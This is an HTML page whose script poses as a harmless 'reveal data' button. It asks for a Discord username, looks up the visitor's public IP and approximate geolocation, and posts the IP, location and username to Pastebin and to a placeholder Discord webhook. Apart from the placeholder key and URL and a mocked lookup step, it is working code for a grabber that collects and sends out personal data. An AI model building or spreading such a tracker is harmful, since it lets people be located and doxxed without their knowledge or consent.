<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP and OSINT Display</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }

        button {
            padding: 10px 20px;
            margin: 20px;
            background-color: #ff0000;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #cc0000;
        }

        #output {
            margin-top: 20px;
            font-size: 16px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <button onclick="startProcess()">Click to Reveal Data</button>
    <div id="output"></div>

    <script>
        async function startProcess() {
            const outputDiv = document.getElementById('output');
            document.body.innerHTML = ''; // Clear the page
            document.body.appendChild(outputDiv);

            // Step 1: Ask for Discord username
            const username = prompt("Enter your Discord username:", "");
            if (!username) {
                outputDiv.innerText = "No username entered. Process aborted.";
                return;
            }
            outputDiv.innerText = "Processing...\n";

            // Step 2: Fetch IP and location data
            try {
                const ip = await getIP();
                appendOutput(`IP Address: ${ip}`);

                const location = await getLocationInfo(ip);
                appendOutput(`Country: ${location.country}`);
                appendOutput(`Timezone: ${location.timezone}`);
                appendOutput(`Latitude: ${location.latitude}`);
                appendOutput(`Longitude: ${location.longitude}`);
                appendOutput(`Address: ${location.address}`);

                // Step 3: Perform OSINT on Discord username
                const osintResults = await performOSINT(username);
                appendOutput(`OSINT Results for ${username}:\n${osintResults}`);

                // Step 4: Save to Pastebin and send to Discord webhook
                const data = {
                    ip,
                    location,
                    osintResults,
                    username,
                };

                const pastebinLink = await saveToPastebin(data);
                appendOutput(`Data saved to Pastebin: ${pastebinLink}`);

                await sendToWebhook(data);
                appendOutput("Data sent to Discord webhook.");
            } catch (error) {
                appendOutput(`Error: ${error.message}`);
            }
        }

        function appendOutput(text) {
            const outputDiv = document.getElementById('output');
            outputDiv.innerText += `\n${text}`;
        }

        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        async function getLocationInfo(ip) {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            return {
                country: data.country_name || 'Unknown',
                timezone: data.timezone || 'Unknown',
                latitude: data.latitude || 'Unknown',
                longitude: data.longitude || 'Unknown',
                address: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`
            };
        }

        async function performOSINT(username) {
            // Simulating OSINT results (replace with real OSINT API calls as needed)
            return `OSINT data for ${username} (mocked):\n- Account age: 2 years\n- Associated email: user@example.com\n- Public servers: ExampleServer1, ExampleServer2`;
        }

        async function saveToPastebin(data) {
            const pastebinApiKey = 'YOUR_PASTEBIN_API_KEY'; // Replace with your Pastebin API key
            const pastebinUrl = 'https://pastebin.com/api/api_post.php';

            const formattedData = JSON.stringify(data, null, 2);
            const params = new URLSearchParams({
                api_dev_key: pastebinApiKey,
                api_option: 'paste',
                api_paste_code: formattedData,
                api_paste_name: 'User Data',
                api_paste_format: 'json'
            });

            const response = await fetch(pastebinUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: params
            });

            const result = await response.text();
            if (result.startsWith('http')) {
                return result;
            } else {
                throw new Error('Failed to save to Pastebin.');
            }
        }

        async function sendToWebhook(data) {
            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `New data collected:\n${JSON.stringify(data, null, 2)}`
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send data to Discord webhook.');
            }
        }
    </script>
</body>
</html>
